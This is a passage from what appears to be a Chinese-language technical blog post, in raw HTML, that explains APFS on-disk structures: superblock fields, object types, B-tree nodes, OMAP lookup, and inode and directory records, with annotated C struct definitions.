oid</span></span><br><span class=\"line\">    <span class=\"type\">uuid_t</span> apfs_volume_group_id;        <span class=\"comment\">// 归属 Volume Group 的 id</span></span><br><span class=\"line\">    <span class=\"type\">oid_t</span> apfs_integrity_meta_oid;      <span class=\"comment\">// 完整性元数据（虚拟对象）的 oid，MacOS 11 之后，用于 Sealed Volume</span></span><br><span class=\"line\">    <span class=\"type\">oid_t</span> apfs_fext_tree_oid;           <span class=\"comment\">// FILE EXTENT 树（虚拟对象）的 oid</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> apfs_fext_tree_type;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> reserved_type;</span><br><span class=\"line\">    <span class=\"type\">oid_t</span> reserved_oid;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>至少有 4 个物理对象的 B-树 ：ROOT DIRECTORY、EXTENT REFRENCE、SNAP METADATA、FILE EXTENT；还有一个虚拟对象的 OMAP B-树。</p>\n</blockquote>\n<h4 id=\"关于-ExtentRef-Tree-的讨论\"><a href=\"#关于-ExtentRef-Tree-的讨论\" class=\"headerlink\" title=\"关于 ExtentRef Tree 的讨论\"></a>关于 ExtentRef Tree 的讨论</h4><p>此问题已解决。<strong>ExtentRef Tree（范围参照树是）一个物理对象，就是当前正在构建的快照！</strong><br>APFS 技术白皮书指出：</p>\n<blockquote>\n<p>When a snapshot is created, the current extent-reference tree is moved to the snapshot.<br>A new, empty, extent-reference tree is created and its object identifier becomes the new value of this field.</p>\n</blockquote>\n<p>当一个快照被创建时，当前的范围参照树就被移动到这个快照；同时，一个新的、空的范围参照树被创建，并将 volume superblock 的<code>apfs_extentref_tree_oid</code>置为这个新的 oid。</p>\n<ul>\n<li>Object Type 定义 extent-reference tree 为<code>OBJECT_TYPE_EXTENT_LIST_TREE</code></li>\n<li>Volume Flag 的定义中，也有一个标记<code>APFS_FS_ALWAYS_CHECK_EXTENTREF</code></li>\n<li>j_snap_metadata_val_t 的结构中，包含<code>extentref_tree_oid</code> 和 <code>extentref_tree_type</code> 字段</li>\n<li>volume superblock 的结构中，包含<code>extentref_tree_oid</code> 和 <code>extentref_tree_type</code> 字段</li>\n</ul>\n<p>此外，APFS 白皮书还有一个勘误信息。</p>\n<blockquote>\n<p>Corrected the discussion of object identifiers in j_snap_metadata_val_t.<br>The extentref_tree_oid and sblock_oid fields contain a physical object identifier, not a virtual object identifier.</p>\n</blockquote>\n<h2 id=\"二、通用组件\"><a href=\"#二、通用组件\" class=\"headerlink\" title=\"二、通用组件\"></a>二、通用组件</h2><h3 id=\"1-Object-对象\"><a href=\"#1-Object-对象\" class=\"headerlink\" title=\"1. Object - 对象\"></a>1. Object - 对象</h3><p>APFS 的对象（Object）都有一个用于查找的唯一标识符<code>oid</code>，有三种不同的存储方法：</p>\n<ul>\n<li>Ephemeral object（临时对象）：当一个容器被加载后，临时对象存储在内存中。临时对象通常用于一些很少更新的数据，出于性能考虑允许在内存中修改，并在 checkpoint 时被持久化存储</li>\n<li>Phycial Object（物理对象）：存储在磁盘上的一个已知的物理块地址。物理对象被修改时，一个新副本将写入磁盘上的新位置，并携带一个不同的<code>oid</code></li>\n<li>Virtual Object（虚拟对象）：同样存储在磁盘上的一个物理块地址。虚拟对象被修改时，一个新副本也将写入磁盘上的新位置，但是<code>oid</code>保持一致；通过 OMAP 可以查询虚拟对象，但必须提供一个事务标识符<code>xid</code>以指定您想要的时间点。</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* 所有对象的 header 定义 */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">obj_phys</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">uint8_t</span>     o_cksum[MAX_CKSUM_SIZE];    <span class=\"comment\">// 对象的64位弗莱彻校验值，类似 CRC 校验</span></span><br><span class=\"line\">    <span class=\"type\">oid_t</span>       o_oid;</span><br><span class=\"line\">    <span class=\"type\">xid_t</span>       o_xid;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span>    o_type;                     <span class=\"comment\">// 分成两部分，低16位是对象类型，高16位是存储方法</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span>    o_subtype;                  <span class=\"comment\">// 对象在 B-树 的节点类型，借用 Object Types 定义</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">obj_phys</span> <span class=\"title\">obj_phys_t</span>;</span></span><br></pre></td></tr></table></figure>\n\n<p>当对象存储在磁盘上时，APFS 规定统一采用<strong>小端字节顺序</strong>，但设计思路有一些不同。容器对象以 block 为单位，并且包含填充字段使得数据长度是64的倍数，以避免内存访问对齐的性能损失；而文件系统对象以 byte 为单位，并且尽量最小化所使用的空间，因此很多 struct 定义都有<code>__attribute__((aligned(8),packed))</code>的编译标识。</p>\n<h3 id=\"2-B-Tree\"><a href=\"#2-B-Tree\" class=\"headerlink\" title=\"2. B-Tree\"></a>2. B-Tree</h3><p>B树（B-tree）是一种泛化的二叉搜索树（binary search tree），特点是每个节点具有两个以上的子节点，从而增加了键&#x2F;值对的数量，减少定位记录时所经历的中间过程，从而加快访问速度；此外，B-树具备自平衡性，可以自动调整其结构以保持特定的平衡因子，从而保证在对数时间内进行操作，因此广泛应用于读写相对较大的数据块的存储系统。</p>\n<p>HFS+ 是基于 B-树 设计的，APFS 也继承下来，其系统组件大量采用 B-树，例如 Filesystem、OMAP 和 snapshot 等。在 APFS 中，B-树 的节点对象称为 Node，分为根节点、中间节点和叶子节点，根节点 Root 是遍历整个树的起点。</p>\n<p>Node 的内部存储空间分为3个部分：TOC（table of content，表空间）、key area 和 vaule area，其中表空间保存了每个键值对的位置信息，Key 和 Value 从节点内部存储区域的首端和尾端开始分别存储，两者之间是共享的自由空间，这种以 offset 的形式存储，比存储完整位置使用更少的磁盘空间。</p>\n<blockquote>\n<p>root 节点尾部增加了统计信息<code>btree_info_t</code>，为此可用存储空间少了 0x28 个字节。</p>\n</blockquote>\n<p><img src=\"/2024/02/11/Apple-File-System%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/btree.png\" alt=\"B-Tree\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* B-树的定位信息 */</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nloc</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> off;                   <span class=\"comment\">// 偏移量（字节单位）</span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> len;                   <span class=\"comment\">// 长度（字节单位）</span></span><br><span class=\"line\">&#125; <span class=\"type\">nloc_t</span>;  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* 普通 Node 的定义 */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">btree_node_phys</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">obj_phys_t</span>  btn_o;              <span class=\"comment\">// 节点对象的头部</span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span>    btn_flags;          <span class=\"comment\">// 标识位，区分 ROOT 或 LEAF</span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span>    btn_level;          <span class=\"comment\">// 节点的等级</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span>    btn_nkeys;          <span class=\"comment\">// 存储了几个键值对</span></span><br><span class=\"line\">    <span class=\"type\">nloc_t</span>      btn_table_space;    <span class=\"comment\">// 有数据区域的空间大小   </span></span><br><span class=\"line\">    <span class=\"type\">nloc_t</span>      btn_free_space;     <span class=\"comment\">// 空闲区域的空间大小</span></span><br><span class=\"line\">    <span class=\"type\">nloc_t</span>      btn_key_free_list;  <span class=\"comment\">// Key 的可用空间列表</span></span><br><span class=\"line\">    <span class=\"type\">nloc_t</span>      btn_val_free_list;  <span class=\"comment\">// Vaule 的可用空间列表</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span>    btn_data[];         <span class=\"comment\">// 节点内部的存储空间</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">btree_node_phys</span> <span class=\"title\">btree_node_phys_t</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* 仅 Root Node */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">btree_info</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">btree_info_fixed_t</span>  bt_fixed;           <span class=\"comment\">// 配置信息，如 Node、Key和Value的长度等</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span>            bt_longest_key;     <span class=\"comment\">// 最大 Key 的长度（字节单位）</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span>            bt_longest_val;     <span class=\"comment\">// 最大 Value 的长度（字节单位）</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span>            bt_key_count;       <span class=\"comment\">// Key 的总数量</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span>            bt_node_count;      <span class=\"comment\">// node 的总数量</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">btree_info</span> <span class=\"title\">btree_info_t</span>;</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>B+树是一个变种，区别是内部节点不存储任何指向记录的指针，这些指针仅存储在叶子节点，因此节点容量更大，树也更浅</p>\n</blockquote>\n<h2 id=\"三、-OMAP\"><a href=\"#三、-OMAP\" class=\"headerlink\" title=\"三、 OMAP\"></a>三、 OMAP</h2><p>在 APFS 中，OMAP（Object Maps，对象映射）扮演两个重要角色。一是负责根据 oid（虚拟对象标识符）和 xid（事务标识符）找到磁盘物理地址，二是提供快照功能，可以立即将虚拟对象回滚到较早的时间点。<br>Object Map 的定义如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">omap_phys</span> &#123;</span>                      </span><br><span class=\"line\">    <span class=\"type\">obj_phys_t</span>  om_o;                       <span class=\"comment\">// 标头</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span>    om_flags;                   <span class=\"comment\">// OMAP 标识，见附表。注意对象内容可能被加密！</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span>    om_snap_count;              <span class=\"comment\">// 快照数量</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span>    om_tree_type;               <span class=\"comment\">// 目前是B-树</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span>    om_snapshot_tree_type;      <span class=\"comment\">// 目前是B-树</span></span><br><span class=\"line\">    <span class=\"type\">oid_t</span>       om_tree_oid;                <span class=\"comment\">// 当前使用的 OMAP B-树的 （root）oid</span></span><br><span class=\"line\">    <span class=\"type\">oid_t</span>       om_snapshot_tree_oid;       <span class=\"comment\">// 当前使用的 快照 B-树的 （root）oid</span></span><br><span class=\"line\">    <span class=\"type\">xid_t</span>       om_most_recent_snap;        <span class=\"comment\">// 最新快照的 xid</span></span><br><span class=\"line\">    <span class=\"type\">xid_t</span>       om_pending_revert_min;      <span class=\"comment\">// 正在回滚事务的 min xid</span></span><br><span class=\"line\">    <span class=\"type\">xid_t</span>       om_pending_revert_max;      <span class=\"comment\">// 正在回滚事务的 max xid</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">omap_phys</span> <span class=\"title\">omap_phys_t</span>;</span></span><br></pre></td></tr></table></figure>\n\n<p>容器和每个卷都维护自己的 OAMP，每个 OMAP 都有自己的虚拟地址空间，因此对象定义要明确归属哪一个 B-Tree ！<br>OMAP 使用 B-树 存储映射关系，其 Key &#x2F; Value 的定义如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">omap_key</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">oid_t</span> ok_oid;       <span class=\"comment\">// 映射对象的虚拟对象标识符</span></span><br><span class=\"line\">    <span class=\"type\">xid_t</span> ok_xid;       <span class=\"comment\">// 映射对象的事务标识符</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">omap_key</span> <span class=\"title\">omap_key_t</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">omap_val</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> ov_flags;  <span class=\"comment\">// 标记位，见附录。注意物理存储可能被加密！！！</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> ov_size;   <span class=\"comment\">// 映射对象的大小（字节单位）</span></span><br><span class=\"line\">    <span class=\"type\">paddr_t</span> ov_paddr;   <span class=\"comment\">// 映射对象起点的物理地址</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">omap_val</span> <span class=\"title\">omap_val_t</span>;</span></span><br></pre></td></tr></table></figure>\n\n<p>有意思的是，OMAP 本身也有一个快照，定义如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">omap_snapshot</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> oms_flags;     <span class=\"comment\">// OMAP_SNAPSHOT_DELETED or OMAP_SNAPSHOT_REVERTED</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> oms_pad; </span><br><span class=\"line\">    <span class=\"type\">oid_t</span> oms_oid;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">omap_snapshot</span> <span class=\"title\">omap_snapshot_t</span>;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"OMAP-的查询流程\"><a href=\"#OMAP-的查询流程\" class=\"headerlink\" title=\"OMAP 的查询流程\"></a>OMAP 的查询流程</h3><p>使用 OMAP 访问虚拟对象时，应遵循如下流程：</p>\n<ol>\n<li>确定对象映射的入口。<br> volume 的对象使用该卷宗的 OMAP，入口是<code>apfs_superblock_t</code>的<code>apfs_omap_oid</code>字段；<br> 否则，所有其他对象应使用容器的 OMAP，入口是<code>nx_superblock_t</code>的<code>nx_omap_oid</code>字段</li>\n<li>读取<code>omap_phys_t</code>的<code>om_tree_oid</code>字段用于定位对象映射的 B-树</li>\n<li>在 B-树 中搜索<code>ok_oid</code> &#x3D;&#x3D; 期望的<code>oid</code>，而且<code>ok_xid</code> &lt;&#x3D; 期望的<code>xid</code> 的 key。如果有多个 key 满足要求，则使用具有最大<code>xid</code>的 key</li>\n<li>使用 Node 节点的 TOC，读取这个 key 对应的 value，其中包含物理地址<code>ov_addr</code>和<code>ov_size</code></li>\n<li>从磁盘的物理地址获得对象数据</li>\n</ol>\n<h2 id=\"四、File-System\"><a href=\"#四、File-System\" class=\"headerlink\" title=\"四、File System\"></a>四、File System</h2><p>每个 APFS 卷宗（Volume）都有一个文件系统（Filesystem）。<br>与其他 APFS 对象（Object）不同，文件系统对象由一个或多个文件系统记录（Record）组成，这些记录存储在 Volume 的 FileSystem Tree 上，每条记录都存储有关 file 或 directory 的特定信息。<br>所有文件系统对象是基于一个专用的 B-Tree 来组织的，并具有以下特点：</p>\n<ul>\n<li>文件系统树是虚拟的，其每个节点都是基于 Volume 的 OMAP 映射出来的虚拟对象。这意味着，检索文件系统树必须依赖 OMAP 定位以查找每个节点</li>\n<li>文件系统树支持快照功能，即充分利用 OMAP 的快照功能将其状态恢复到以前的时间点，Time Machine 的增量备份功能就是一个典型应用</li>\n<li>可以选择对文件系统的节点进行加密，不仅可以加密文件内容，还可以加密文件元数据</li>\n<li>文件系统树存储了一组异构记录，也即是说，多种类型的键和值都存储在同一树中</li>\n</ul>\n<p>文件系统树的每个节点都有唯一标识<code>j_key</code>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJ_ID_MASK     0x0fffffff<span class=\"string\">&#x27;ffffffff</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"meta\">#define OBJ_TYPE_MASK   0xf0000000&#x27;</span>00000000</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> OBJ_TYPE_SHIFT  60</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_key</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> obj_id_and_type;</span><br><span class=\"line\">&#125; <span class=\"type\">j_key_t</span>;</span><br></pre></td></tr></table></figure>\n\n<p>为了充分利用内存空间，前 4 个字节是记录（Record）的类型定义，包括：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">enum</span> &#123;</span> </span><br><span class=\"line\">    APFS_TYPE_ANY               = <span class=\"number\">0</span>,</span><br><span class=\"line\">    APFS_TYPE_SNAP_METADATA     = <span class=\"number\">1</span>,        <span class=\"comment\">// 快照的元数据</span></span><br><span class=\"line\">    APFS_TYPE_EXTENT            = <span class=\"number\">2</span>,        <span class=\"comment\">// 物理扩展信息</span></span><br><span class=\"line\">    APFS_TYPE_INODE             = <span class=\"number\">3</span>,        <span class=\"comment\">// 必选项！最核心的元数据</span></span><br><span class=\"line\">    APFS_TYPE_XATTR             = <span class=\"number\">4</span>,        <span class=\"comment\">// TODO：似乎用于支持文件系统Fork的功能</span></span><br><span class=\"line\">    APFS_TYPE_SIBLING_LINK      = <span class=\"number\">5</span>,        <span class=\"comment\">// 标记一个 inode 节点被那些硬链接所引用的映射          </span></span><br><span class=\"line\">    APFS_TYPE_DSTREAM_ID        = <span class=\"number\">6</span>,        <span class=\"comment\">// 重要！默认数据流的入口和调用计数器 rfcnt</span></span><br><span class=\"line\">    APFS_TYPE_CRYPTO_STATE      = <span class=\"number\">7</span>,        <span class=\"comment\">// 重要！数据保护等级</span></span><br><span class=\"line\">    APFS_TYPE_FILE_EXTENT       = <span class=\"number\">8</span>,        <span class=\"comment\">// 重要！文件扩展信息，crypto_id 就在这里</span></span><br><span class=\"line\">    APFS_TYPE_DIR_REC           = <span class=\"number\">9</span>,        <span class=\"comment\">// 保存该目录的成员信息，filename 就在这里</span></span><br><span class=\"line\">    APFS_TYPE_DIR_STATS         = <span class=\"number\">10</span>,       <span class=\"comment\">// 目录的统计信息，包括成员数量、总容量、父目录oid等</span></span><br><span class=\"line\">    APFS_TYPE_SNAP_NAME         = <span class=\"number\">11</span>,       <span class=\"comment\">// 快照名称</span></span><br><span class=\"line\">    APFS_TYPE_SIBLING_MAP       = <span class=\"number\">12</span>,       <span class=\"comment\">// 标记一个硬链接文件的目标 inode 节点的映射</span></span><br><span class=\"line\">    APFS_TYPE_FILE_INFO         = <span class=\"number\">13</span>,  </span><br><span class=\"line\"></span><br><span class=\"line\">    APFS_TYPE_MAX_VALID         = <span class=\"number\">13</span>,    </span><br><span class=\"line\">    APFS_TYPE_MAX               = <span class=\"number\">15</span>,    </span><br><span class=\"line\">    APFS_TYPE_INVALID           = <span class=\"number\">15</span>,    </span><br><span class=\"line\">&#125; j_obj_types;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-文件和目录\"><a href=\"#1-文件和目录\" class=\"headerlink\" title=\"1. 文件和目录\"></a>1. 文件和目录</h3><p>文件系统树的每个节点都必须有 inode 记录，第一条记录就是 Root Directory。</p>\n<h4 id=\"INODE-记录\"><a href=\"#INODE-记录\" class=\"headerlink\" title=\"INODE 记录\"></a>INODE 记录</h4><p>inode 负责管理最核心的元数据，例如时间戳、类型、所有者和权限等，都是固定长度的标准格式，其他信息将被存入 inode 的扩展字段，或者其他类型的 Record 中</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* inode 数据结构 */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_inode_key</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">j_key_t</span> hdr;                                <span class=\"comment\">// = header, key &amp; value</span></span><br><span class=\"line\">&#125; __attribute__((packed));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_inode_val</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> parent_id;                         <span class=\"comment\">// 所在目录的ID</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> private_id;                        <span class=\"comment\">// 默认数据流的ID！</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> create_time;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> mod_time;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> change_time;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> access_time;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> internal_flags;                    <span class=\"comment\">// 标志位</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">union</span> &#123;</span>                                     <span class=\"comment\">// 仅用于目录</span></span><br><span class=\"line\">        <span class=\"type\">int32_t</span> nchildren;</span><br><span class=\"line\">        <span class=\"type\">int32_t</span> nlink;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"type\">cp_key_class_t</span> default_protection_class;    <span class=\"comment\">// 默认数据保护级别</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> write_generation_counter;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> bsd_flags;</span><br><span class=\"line\">    <span class=\"type\">uid_t</span> owner;</span><br><span class=\"line\">    <span class=\"type\">gid_t</span> group;</span><br><span class=\"line\">    <span class=\"type\">mode_t</span> mode;</span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> pad1;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> uncompressed_size;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> xfields[];                          <span class=\"comment\">// 扩展字段的入口</span></span><br><span class=\"line\">&#125; __attribute__((packed));</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_inode_val</span> <span class=\"title\">j_inode_val_t</span>;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"Extended-Fields（扩展字段）\"><a href=\"#Extended-Fields（扩展字段）\" class=\"headerlink\" title=\"Extended Fields（扩展字段）\"></a>Extended Fields（扩展字段）</h5><p>inode 记录支持有限的扩展字段（Extended Fields），入口就在<code>uint8_t xfield[]</code>，其类型定义包括：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> INO_EXT_TYPE_SNAP_XID           1       <span class=\"comment\">// 快照的事物标识符xid</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> INO_EXT_TYPE_DELTA_TREE_OID     2       <span class=\"comment\">// 与快照的增量列表对应的文件系统B-树的虚拟对象标识符</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> INO_EXT_TYPE_DOCUMENT_ID        3       <span class=\"comment\">// 文档标识符，用于大量文件的目录更改期间的事务完整性</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> INO_EXT_TYPE_NAME               4       <span class=\"comment\">// 硬链接指向的文件名！</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> INO_EXT_TYPE_PREV_FSIZE         5       <span class=\"comment\">// 文件以前的长度</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> INO_EXT_TYPE_RESERVED_6         6       </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> INO_EXT_TYPE_FINDER_INFO        7       <span class=\"comment\">// Finder的提示信息，Apple自定义</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> INO_EXT_TYPE_DSTREAM            8       <span class=\"comment\">// 数据流，即文件内容数据</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> INO_EXT_TYPE_RESERVED_9         9 </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> INO_EXT_TYPE_DIR_STATS_KEY      10      <span class=\"comment\">// 有关目录的统计信息</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> INO_EXT_TYPE_FS_UUID            11      <span class=\"comment\">// 自动挂载到该目录的文件系统UUID（考虑/etc/fstab）</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> INO_EXT_TYPE_RESERVED_12        12 </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> INO_EXT_TYPE_SPARSE_BYTES       13      <span class=\"comment\">// 数据流中的稀疏字节数量</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> INO_EXT_TYPE_RDEV               14      <span class=\"comment\">// 块设备或字符专用设备的标识符</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> INO_EXT_TYPE_PURGEABLE_FLAGS    15 </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> INO_EXT_TYPE_ORIG_SYNC_ROOT_ID  16</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>inode 记录的扩展字段<code>INO_EXT_TYPE_NAME</code>，存储的并不是该节点的文件名，而是在该节点是一个硬链接的场景下，其对应的源目标文件名</p>\n</blockquote>\n<h4 id=\"DIR-REC-记录\"><a href=\"#DIR-REC-记录\" class=\"headerlink\" title=\"DIR_REC 记录\"></a>DIR_REC 记录</h4><p>当我们新建一个文件目录时，当然必须创建一个 inode 记录，此时它是一个空目录。<br>然后，我们继续在该目录下新建一个文件时，需要新增 2 条记录，一是新文件的 inode 记录，二是 DIR_REC 记录，用于该目录管理其子对象，也就是说，一个目录下有几个文件或子目录，就有几条 DIR_REC 记录。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_drec_hashed_key</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">j_key_t</span> hdr;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> name_len_and_hash;     <span class=\"comment\">// 最低10位是 filename 的长度，前面是文件名的哈希值</span></span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> name[<span class=\"number\">0</span>];                <span class=\"comment\">// filename！UTF-8编码格式，NULL结尾</span></span><br><span class=\"line\">&#125; __attribute__((packed));</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_drec_hashed_key</span> <span class=\"title\">j_drec_hashed_key_t</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> J_DREC_LEN_MASK     0x000003ff</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> J_DREC_HASH_MASK    0xfffff400</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> J_DREC_HASH_SHIFT   10</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_drec_val</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> file_id;               <span class=\"comment\">// 子成员的ID</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> date_added;            <span class=\"comment\">// 添加到该目录的时间戳</span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> flags;                 <span class=\"comment\">// 标记该成员的类型，例如普通文件、目录、块设备、软连接、Socket等</span></span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> xfields[];</span><br><span class=\"line\">&#125; __attribute__((packed));</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_drec_val</span> <span class=\"title\">j_drec_val_t</span>;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>找了很久 filename 的存储方式，最后发现不在 File 的 inode 记录中，而是藏在归属目录的 DIR_REC 记录中！因为操作系统处理时只需要唯一标识符<code>j_key</code>，其实文件名只是提供用户查询显示的</li>\n<li>早期版本的 APFS 使用<code>j_drec_key</code>，后来升级为<code>j_drec_hashed_key</code>，区别就是增加了文件名的哈希值，这个变化非常有利于提高<strong>长文件名</strong>的搜索效率，即不用逐一比较字符串，而是直接比较哈希值即可</li>\n<li>DIR_REC 记录同样支持扩展字段，其定义与 inode 记录保持一致</li>\n</ul>\n<h3 id=\"2-数据流\"><a href=\"#2-数据流\" class=\"headerlink\" title=\"2. 数据流\"></a>2. 数据流</h3><p>类似 filename 的<strong>短数据</strong>可以存储在 metadata 